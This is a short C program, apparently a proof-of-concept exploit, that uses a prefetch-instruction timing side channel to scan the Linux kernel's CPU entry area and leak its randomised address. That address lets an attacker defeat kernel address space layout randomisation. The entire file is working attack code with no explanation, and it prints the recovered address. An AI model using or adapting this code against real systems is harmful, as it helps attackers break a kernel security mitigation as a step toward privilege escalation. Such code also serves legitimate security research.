#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define CPUAREA_LOWER_BOUND 0xfffffe0000000000ull
#define CPUAREA_UPPER_BOUND 0xfffffefffffff000ull

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define STEP 0x3b000ull
#define SCAN_START CPUAREA_LOWER_BOUND
#define SCAN_END CPUAREA_UPPER_BOUND

#define START_ADDR SCAN_START/STEP


#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP
#define PER_ARR_SIZE ARR_SIZE/10
#define PER_SIZE PER_ARR_SIZE*STEP

uint64_t cea_addr;
uint64_t min = ~0, addr = ~0;
void leak_syscall_entry(uint64_t n) 
{
    uint64_t data[PER_ARR_SIZE] = {0};


    for (uint64_t i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < PER_ARR_SIZE; idx++) 
        {
            uint64_t test = 0xe000 + (idx + START_ADDR) * STEP + n * PER_SIZE;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    for (uint64_t i = 0; i < PER_ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = 0xe000 + (i + START_ADDR) * STEP+ n * PER_SIZE;
        }

    }

}

int main()
{
    for(uint64_t i =0;i<10;i++ ) leak_syscall_entry(i);
    printf("%llx %ld\n",addr, min);
}
